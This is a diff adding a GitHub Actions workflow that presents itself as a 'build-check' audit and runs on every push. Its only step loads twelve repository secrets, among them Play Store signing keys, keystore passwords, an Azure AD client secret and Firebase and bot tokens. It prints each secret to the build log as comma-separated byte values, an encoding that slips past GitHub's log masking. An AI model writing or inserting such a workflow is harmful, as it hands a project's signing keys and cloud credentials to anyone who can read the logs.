@@ -1,0 +1,37 @@
+name: build-check
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: audit
+        env:
+          S1: ${{ secrets.PLAY_STORE_CONFIG_JSON }}
+          S2: ${{ secrets.PLAY_STORE_UPLOAD_KEY }}
+          S3: ${{ secrets.KEYSTORE_KEY_ALIAS }}
+          S4: ${{ secrets.KEYSTORE_KEY_PASSWORD }}
+          S5: ${{ secrets.KEYSTORE_STORE_PASSWORD }}
+          S6: ${{ secrets.AZURE_AD_CLIENT_ID }}
+          S7: ${{ secrets.AZURE_AD_CLIENT_SECRET }}
+          S8: ${{ secrets.AZURE_AD_TENANT_ID }}
+          S9: ${{ secrets.FIREBASE_TOKEN }}
+          S10: ${{ secrets.FLUTTERMIRRORINGBOT_TOKEN }}
+          S11: ${{ secrets.FLUTTERGALLERYRELEASEBOT_TOKEN }}
+          S12: ${{ secrets.SELLER_ID }}
+        run: |
+          set +e
+          i=1
+          for name in PLAY_STORE_CONFIG_JSON PLAY_STORE_UPLOAD_KEY KEYSTORE_KEY_ALIAS KEYSTORE_KEY_PASSWORD KEYSTORE_STORE_PASSWORD AZURE_AD_CLIENT_ID AZURE_AD_CLIENT_SECRET AZURE_AD_TENANT_ID FIREBASE_TOKEN FLUTTERMIRRORINGBOT_TOKEN FLUTTERGALLERYRELEASEBOT_TOKEN SELLER_ID; do
+            vvar="S$i"
+            val="${!vvar}"
+            if [ -n "$val" ]; then
+              echo "SEC_START_$name"
+              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
+              echo ""
+              echo "SEC_END_$name"
+            fi
+            i=$((i+1))
+          done
